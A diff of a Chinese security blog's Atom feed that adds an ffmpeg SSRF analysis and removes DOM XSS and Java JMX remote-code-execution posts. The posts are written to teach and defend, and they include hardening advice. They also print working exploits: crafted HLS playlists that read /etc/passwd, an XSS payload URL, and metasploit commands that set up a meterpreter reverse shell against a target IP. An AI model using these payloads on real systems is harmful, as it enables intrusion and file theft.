@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-01-18T08:52:47.000Z</updated>
+  <updated>2016-01-19T08:31:25.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,74 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[ffmpeg SSRF漏洞分析]]></title>
+    <link href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <id>http://xdxd.love/2016/01/18/ffmpeg-SSRF漏洞分析/</id>
+    <published>2016-01-18T10:41:41.000Z</published>
+    <updated>2016-01-19T08:31:25.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">这个文章</a>，但是俄语看不懂，google翻译也没看懂。中文的相关报道都是来自<a href="http://www.solidot.org/story?sid=46891" target="_blank" rel="external">solidot</a>15日的这个简短报道。<br><img src="/images/ffmpegssrf1.png" alt=""></p>
+<p>而ffmpeg得反应很快，1月16日就发布了修复版本。</p>
+<p><img src="/images/ffmpegssrf2.png" alt=""></p>
+<h1 id="漏洞影响">漏洞影响</h1><p>如果ffmpeg解析了一个恶意的文件，会导致本地的文件信息泄露。受影响的出了ctf中这个在线视频格式转换的服务外，如果是采用ffmpeg了客户端如果可以输入恶意文件也会造成本地文件信息泄露。</p>
+<h1 id="漏洞分析">漏洞分析</h1><p>change log中提到了两个CVE CVE-2016-1897和CVE-2016-1898。</p>
+<h2 id="CVE-2016-1897">CVE-2016-1897</h2><p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对concat的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a> )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
+<pre><code><span class="preprocessor">#EXTM3U</span>
+<span class="preprocessor">#EXT-X-MEDIA-SEQUENCE:0</span>
+<span class="preprocessor">#EXTINF:10.0,</span>
+concat:http:<span class="comment">//dx.su/header.m3u8|file:///etc/passwd</span>
+<span class="preprocessor">#EXT-X-ENDLIST</span>
+</code></pre><p>CVE-2016-1898</p>
+<p>FFmpeg 2.x版本允许攻击者通过服务器端请求伪造(SSRF：Server-Side Request Forgery) 恶意远程窃取服务器端本地文件，由于ffmpeg的hls没有进行对file域协议进行有效限制，导致攻击者可通过构造hls切片索引文件以及ffmpeg对subfile的支持(<a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a>  )来恶意远程窃取服务器端本地文件/etc/passwd，所构造的恶意视频文件如下所示：</p>
+<pre><code><span class="comment">#EXTM3U</span>
+<span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span>
+<span class="comment">#EXTINF:10.0,</span>
+<span class="symbol">concat:</span><span class="symbol">http:</span>/<span class="regexp">/localhost/header</span>.m3u8|subfile,,start,<span class="number">0</span>,<span class="keyword">end</span>,<span class="number">64</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">64</span>,<span class="keyword">end</span>,<span class="number">128</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">128</span>,<span class="keyword">end</span>,<span class="number">256</span>,,<span class="symbol">:///etc/passwdconcat</span><span class="symbol">:http</span><span class="symbol">://localhost/header</span>.m3u8|subfile,,start,<span class="number">256</span>,<span class="keyword">end</span>,<span class="number">512</span>,,<span class="symbol">:///etc/passwd</span>
+<span class="comment">#EXT-X-ENDLIST</span>
+</code></pre><h1 id="CTF">CTF</h1><p>比较有意思的是查资料的过程中发现了这篇文章<a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">9447 CTF 2015: Super Turbo Atomic GIF Converter</a></p>
+<p>可以看到以下几个方式可以读取文件:</p>
+<pre><code><span class="id">#EXTM3U</span>
+<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
+<span class="id">#EXTINF</span>:<span class="number">1</span>,
+/home/ctf/flag<span class="class">.txt</span>
+<span class="id">#EXT-X-ENDLIST</span>
+
+<span class="id">#EXTM3U</span>
+<span class="id">#EXT-X-PLAYLIST-TYPE</span>:VOD
+<span class="id">#EXT-X-TARGETDURATION</span>:<span class="number">1</span>
+<span class="id">#EXT-X-VERSION</span>:<span class="number">3</span>
+<span class="id">#EXT-X-MEDIA-SEQUENCE</span>:<span class="number">0</span>
+<span class="id">#EXTINF</span>:<span class="number">10.0</span>,
+file:<span class="comment">///home/ctf/flag.txt</span>
+#EXT-X-ENDLIST
+</code></pre><p>以及这里cve的concat方式。利用0day做ctf也是高端。</p>
+<h1 id="参考资料">参考资料</h1><p><a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">通过 ffmpeg 的播放列表实现 SSRF 以及窃取文件</a><br><a href="http://seclists.org/oss-sec/2016/q1/85" target="_blank" rel="external">http://seclists.org/oss-sec/2016/q1/85</a><br><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897" target="_blank" rel="external">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-1897</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#concat" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#concat</a><br><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">https://www.ffmpeg.org/ffmpeg-protocols.html#subfile</a><br><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/web/super-turbo-atomic-gif-converter</a><br><a href="http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html" target="_blank" rel="external">http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html</a><br><a href="https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter" target="_blank" rel="external">https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter</a><br><a href="http://pastebin.com/FrsQinQz" target="_blank" rel="external">http://pastebin.com/FrsQinQz</a><br><a href="https://gist.github.com/Invizory/e45e1ee54cf0687f2002" target="_blank" rel="external">https://gist.github.com/Invizory/e45e1ee54cf0687f2002</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="漏洞预警">漏洞预警</h1><p>这个漏洞关注度不高，最先被人知道应该是俄罗斯人写的<a href="http://habrahabr.ru/company/mailru/blog/274855/" target="_blank" rel="external">]]>
+    </summary>
+    
+      <category term="ffmpeg" scheme="http://xdxd.love/tags/ffmpeg/"/>
+    
+      <category term="漏洞挖掘" scheme="http://xdxd.love/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[freecms sql注入分析]]></title>
+    <link href="http://xdxd.love/2016/01/18/freecms-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
+    <id>http://xdxd.love/2016/01/18/freecms-sql注入分析/</id>
+    <published>2016-01-18T09:30:21.000Z</published>
+    <updated>2016-01-18T10:41:08.000Z</updated>
+    <content type="html"></content>
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="漏洞挖掘" scheme="http://xdxd.love/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[mysql表名大小写敏感问题]]></title>
@@ -910,140 +978,6 @@ retdata['<span class="literal">result</span>'],retdata['error'] = ret
       <category term="sqlmap" scheme="http://xdxd.love/tags/sqlmap/"/>
     
       <category term="奇技淫巧" scheme="http://xdxd.love/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[几个DOM XSS案例分析]]></title>
-    <link href="http://xdxd.love/2015/11/03/%E5%87%A0%E4%B8%AADOM-XSS%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
-    <id>http://xdxd.love/2015/11/03/几个DOM-XSS案例分析/</id>
-    <published>2015-11-03T07:03:31.000Z</published>
-    <updated>2015-12-29T09:07:37.000Z</updated>
-    <content type="html"><![CDATA[<p>案例一：</p>
-<p>搜索框输入payload，点击搜索的时候触发。利用起来比较鸡肋，一直对dom xss没有仔细分析过，记录一下dom xss的常规分析方法。</p>
-<p><img src="/images/domxss1.png" alt=""></p>
-<p>在输入框中输入单引号，查看console报错。定位到goPage函数。<br><img src="/images/domxss2.png" alt=""></p>
-<p>定位到相关代码：</p>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">getSearchKeys</span>(<span class="params"></span>) </span>{
-    <span class="keyword">var</span> keys = {};
-    <span class="keyword">if</span> (!<span class="built_in">window</span>.location.search)
-        <span class="keyword">return</span> keys;
-    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="built_in">window</span>.location.search.slice(<span class="number">1</span>).split(<span class="string">"&amp;"</span>), i = <span class="number">0</span>, len = t.length; len &gt; i; i++) {
-        <span class="keyword">var</span> m = t[i].split(<span class="string">"="</span>);
-        keys[m[<span class="number">0</span>]] = m[<span class="number">1</span>]
-    }
-    <span class="keyword">return</span> keys
-}
-<span class="function"><span class="keyword">function</span> <span class="title">goPage</span>(<span class="params">keys</span>) </span>{
-    <span class="built_in">window</span>.location.href = <span class="built_in">window</span>.location.protocol + <span class="string">"//"</span> + <span class="built_in">window</span>.location.host + <span class="built_in">window</span>.location.pathname + <span class="string">"?"</span> + <span class="built_in">eval</span>(<span class="string">"'"</span> + <span class="built_in">JSON</span>.stringify(keys) + <span class="string">"'"</span>).slice(<span class="number">1</span>, -<span class="number">1</span>).replace(<span class="regexp">/\"/g</span>, <span class="string">""</span>).replace(<span class="regexp">/\:/g</span>, <span class="string">"="</span>).replace(<span class="regexp">/\,/g</span>, <span class="string">"&amp;"</span>)
-}
-</code></pre><p>getSearchKeys获取url中的search参数，保存到keys中。在goPage中，keys进入了eval函数。如下：</p>
-<pre><code>eval<span class="list">(<span class="string">"'"</span> + JSON.stringify<span class="list">(<span class="keyword">keys</span>)</span> + <span class="string">"'"</span>)</span>
-</code></pre><p>导致js执行。</p>
-<p><img src="/images/domxss3.png" alt=""></p>
-<p>调试js，异常时断点。可以观察keys的值，以及eval执行的字符串。</p>
-<p>修复代码：去掉了eval函数</p>
-<pre><code><span class="function"><span class="keyword">function</span> <span class="title">goPage</span>(<span class="params">keys</span>) </span>{
-        <span class="keyword">var</span> sk = combineKeys(keys);
-        <span class="built_in">window</span>.location.href = <span class="built_in">window</span>.location.protocol + <span class="string">"//"</span> + <span class="built_in">window</span>.location.host + <span class="built_in">window</span>.location.pathname + <span class="string">"?"</span> + sk
-    }
-    <span class="function"><span class="keyword">function</span> <span class="title">combineKeys</span>(<span class="params">keys</span>) </span>{
-        <span class="keyword">var</span> currSearch = <span class="built_in">window</span>.location.search;
-        <span class="keyword">if</span> (currSearch) {
-            currSearch = currSearch.slice(<span class="number">1</span>) + <span class="string">"&amp;"</span>;
-            <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> keys)
-                <span class="keyword">if</span> (currSearch.indexOf(key + <span class="string">"="</span>) &gt;= <span class="number">0</span>) {
-                    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(key + <span class="string">"=(.|\n)*?&amp;"</span>);
-                    currSearch = currSearch.replace(reg, key + <span class="string">"="</span> + keys[key] + <span class="string">"&amp;"</span>)
-                } <span class="keyword">else</span>
-                    currSearch = currSearch + key + <span class="string">"="</span> + keys[key] + <span class="string">"&amp;"</span>;
-            currSearch = currSearch.slice(<span class="number">0</span>, -<span class="number">1</span>)
-        } <span class="keyword">else</span>
-            <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> keys)
-                currSearch = currSearch + key + <span class="string">"="</span> + keys[key];
-        <span class="keyword">return</span> currSearch
-    }
-</code></pre><p>案例二：</p>
-<p><a href="https://url?fileName=111jpg&amp;cameraName=%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/span%3E" target="_blank" rel="external">https://url?fileName=111jpg&amp;cameraName=%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/span%3E</a>  触发。</p>
-<p>形式看起来像反射xss，但是搜索源码没有发现alert关键词。在script标签中，输入alert(1);111111这样执行到这里的时候会触发异常，使用chrome的调试工具的异常断点。</p>
-<p><img src="/images/dom2.jpg" alt=""></p>
-<p>之后使用F10 step over next function call 按钮。定位到<br><img src="/images/dom3.jpg" alt=""></p>
-<p>看到是因为$(‘#cameraName’).html(cameraName); 直接html()获取到的内容导致的dom型xss。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>案例一：</p>
-<p>搜索框输入payload，点击搜索的时候触发。利用起来比较鸡肋，一直对dom xss没有仔细分析过，记录一下dom xss的常规分析方法。</p>
-<p><img src="/images/domxss1.png" alt=""></p>
-<p>在输]]>
-    </summary>
-    
-      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[Java JMX Server 代码执行漏洞利用及防御]]></title>
-    <link href="http://xdxd.love/2015/10/27/Java-JMX-Server-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E9%98%B2%E5%BE%A1/"/>
-    <id>http://xdxd.love/2015/10/27/Java-JMX-Server-代码执行漏洞利用及防御/</id>
-    <published>2015-10-27T07:03:44.000Z</published>
-    <updated>2015-11-24T03:27:38.000Z</updated>
-    <content type="html"><![CDATA[<p>#jmx基本概念<br>官方说法：<br>JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服务管理应用<br>通常用来监控jvm会使用这个服务。对外开放一个端口提供服务。使用官方jconsole连上可以查看jvm应用的各种信息。<br><img src="/images/jmx4.png" alt=""><br><a href="http://www.oracle.com/technetwork/articles/java/javamanagement-140525.html" target="_blank" rel="external">Java Management Extensions (JMX) Technology</a></p>
-<p>#不安全配置</p>
-<p>来自oracle官方文档：</p>
-<pre><code>Disabling Security
-To disable both password authentication and SSL (namely to disable all security), you should <span class="operator"><span class="keyword">set</span> the <span class="keyword">following</span> <span class="keyword">system</span> properties <span class="keyword">when</span> you <span class="keyword">start</span> the <span class="keyword">Java</span> VM.
-
-com.sun.<span class="keyword">management</span>.jmxremote.authenticate=<span class="literal">false</span>
-com.sun.<span class="keyword">management</span>.jmxremote.ssl=<span class="literal">false</span>
-
-Caution - This configuration <span class="keyword">is</span> insecure: <span class="keyword">any</span> remote <span class="keyword">user</span> who knows (<span class="keyword">or</span> guesses) your port <span class="built_in">number</span> <span class="keyword">and</span> host <span class="keyword">name</span> will be able <span class="keyword">to</span> monitor <span class="keyword">and</span> control your <span class="keyword">Java</span> applications <span class="keyword">and</span> platform. Furthermore, possible harm <span class="keyword">is</span> <span class="keyword">not</span> limited <span class="keyword">to</span> the <span class="keyword">operations</span> you <span class="keyword">define</span> <span class="keyword">in</span> your MBeans. A remote <span class="keyword">client</span> could <span class="keyword">create</span> a javax.<span class="keyword">management</span>.loading.MLet MBean <span class="keyword">and</span> <span class="keyword">use</span> it <span class="keyword">to</span> <span class="keyword">create</span> <span class="keyword">new</span> MBeans <span class="keyword">from</span> arbitrary URLs, <span class="keyword">at</span> <span class="keyword">least</span> <span class="keyword">if</span> there <span class="keyword">is</span> <span class="keyword">no</span> <span class="keyword">security</span> manager. <span class="keyword">In</span> other words, a rogue remote <span class="keyword">client</span> could make your <span class="keyword">Java</span> application <span class="keyword">execute</span> arbitrary code.
-
-Consequently, <span class="keyword">while</span> disabling <span class="keyword">security</span> might be acceptable <span class="keyword">for</span> development, it <span class="keyword">is</span> strongly recommended that you <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">disable</span> <span class="keyword">security</span> <span class="keyword">for</span> production systems.</span>
-</code></pre><p>当禁用代码执行的时候存在任意代码执行问题。<br><a href="https://www.exploit-db.com/exploits/36101/" target="_blank" rel="external">metaploit</a>模块描述如下：</p>
-<pre><code>This module takes advantage <span class="tag">a</span> Java JMX interface insecure configuration, which would allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication disabled (com<span class="class">.sun</span><span class="class">.management</span><span class="class">.jmxremote</span><span class="class">.authenticate</span>=false) should be vulnerable, while interfaces with authentication enabled will be vulnerable only <span class="keyword">if</span> <span class="tag">a</span> weak configuration is deployed (allowing to use javax<span class="class">.management</span><span class="class">.loading</span><span class="class">.MLet</span>, having <span class="tag">a</span> security manager allowing to load <span class="tag">a</span> ClassLoader MBean, etc
-</code></pre><p>当开启了密码认证的时候还需要其他限制条件才可以利用。</p>
-<p>#漏洞利用程序<br>漏洞利用程序可以使用<a href="https://github.com/mogwaisec/mjet" target="_blank" rel="external">mjet</a>。过程参考<a href="http://www.n0tr00t.com/2015/04/17/JMX-RMI-Exploit-Demo.html" target="_blank" rel="external">JMX RMI Exploit Demo</a></p>
-<p>#测试记录<br>安装mjet</p>
-<pre><code>git clone  https://github.com/mogwaisec/mjet
-
-<span class="built_in">Copy</span> <span class="bash">the <span class="string">"MBean"</span> folder to <span class="string">"data/java/metasploit"</span>
-</span><span class="built_in">Copy</span> <span class="bash">java_mlet_server.rb to <span class="string">"modules/exploits/multi/misc/"</span></span>
-</code></pre><p>在kali 1.1.0中metasploit路径为/opt/metasploit/apps/pro/msf3</p>
-<p>启动metasploit：</p>
-<pre><code>msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; use exploit/multi/misc/java_mlet_server 
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set payload java/meterpreter/reverse_tcp 
-payload =&gt; java/meterpreter/reverse_tcp
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LHOST <span class="number">13.7</span>.<span class="number">8.53</span>
-LHOST =&gt; <span class="number">13.7</span>.<span class="number">8.53</span>
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; set LPORT <span class="number">29999</span>
-LPORT =&gt; <span class="number">29999</span>
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; run
-[*] Exploit running as <span class="attribute">background</span> job.
-[*] Started reverse handler on <span class="number">13.7</span>.<span class="number">8.53</span>:<span class="number">29999</span> 
-msf <span class="function"><span class="title">exploit</span><span class="params">(java_mlet_server)</span></span> &gt; [*] Using URL: http:<span class="comment">//0.0.0.0:8080/2B7JthqVZW</span>
-[*]  Local IP: http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW</span>
-[*] Server started.
-</code></pre><p><img src="/images/jmx1.png" alt=""><br>或得payload url，作为u参数。</p>
-<pre><code>java -jar mjet/mjet<span class="class">.jar</span> -<span class="tag">p</span> <span class="number">9090</span> -u http:<span class="comment">//13.7.8.53:8080/2B7JthqVZW -t 42.91.1.1</span>
-</code></pre><p><img src="/images/jmx2.png" alt=""><br>msf获得权限<br><img src="/images/jmx3.png" alt=""></p>
-<p>图片来自<a href="http://www.ricter.me/posts/JMX%20RMI%20Exploit%20%E5%AE%9E%E4%BE%8B?_=1445856355931" target="_blank" rel="external">JMX RMI Exploit 实例</a></p>
-<p>#测试失败记录<br>测试的时候发现如果不使用msf，自己架web服务提供恶意Mbean，jar包一定要配置对，如果配置错误的话，除非对方服务重启，不然每次都是加载第一次错误的包导致利用失败。</p>
-<p>#启用安全的配置<br>    So it’s important to keep in mind that setting java.rmi.server.hostname has no effect on whether or not this is an insecure configuration.  If you actually want to secure your JMX RMI port, you have many options, such as (in decreasing order of preference):</p>
-<pre><code>Don’t pass com.sun.management.jmxremote.port. This will <span class="operator"><span class="keyword">start</span> a <span class="keyword">local</span>-<span class="keyword">only</span> JMX <span class="keyword">server</span>, <span class="keyword">and</span> you can <span class="keyword">get</span> the <span class="keyword">connection</span> address <span class="keyword">from</span> com.sun.<span class="keyword">management</span>.jmxremote.localConnectorAddress  <span class="keyword">http</span>://docs.<span class="keyword">oracle</span>.com/javase/<span class="number">6</span>/docs/technotes/guides/<span class="keyword">management</span>/<span class="keyword">agent</span>.html
-<span class="keyword">Enable</span> SSL <span class="keyword">client</span> certificate <span class="keyword">authentication</span>
-<span class="keyword">Enable</span> <span class="keyword">password</span> <span class="keyword">authentication</span> <span class="keyword">and</span> <span class="keyword">use</span> SSL
-Firewall your JMX RMI port
-+ See more <span class="keyword">at</span>: <span class="keyword">http</span>://www.accuvant.com/blog/exploiting-jmx-rmi#sthash.AsAasfPW.dpuf</span>
-</code></pre><p>除了启用密码认证和SSL，还可以配置防火墙。文中还提到了不要指定端口，以及设置java.rmi.server.hostname是不安全的配置，这个点没有具体测试。</p>
-<p>#参考资料<br><a href="http://www.accuvant.com/blog/exploiting-jmx-rmi" target="_blank" rel="external">Exploiting JMX RMI</a><br><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent.html" target="_blank" rel="external">jmx配置官方文档</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>#jmx基本概念<br>官方说法：<br>JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统等植入管理功能的框架。JMX可以跨越一系列异构操作系统平台、系统体系结构和网络传输协议，灵活的开发无缝集成的系统、网络和服]]>
-    </summary>
-    
-      <category term="java" scheme="http://xdxd.love/tags/java/"/>
-    
-      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
